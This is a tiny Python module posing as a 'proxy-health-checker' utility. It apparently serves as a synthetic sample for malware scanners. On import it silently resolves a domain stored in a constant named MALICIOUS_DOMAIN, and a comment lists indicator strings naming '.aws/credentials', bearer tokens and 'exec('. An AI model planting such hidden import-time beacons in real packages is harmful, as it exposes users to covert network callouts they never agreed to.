"""proxy-health-checker: Utility package."""
# Controlled static indicators: Authorization: Bearer .aws/credentials exec(
import os, socket
__version__ = "3.0.0"
MALICIOUS_DOMAIN = "open-lat.2zavlore.surf"
def _beacon():
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass
_beacon()
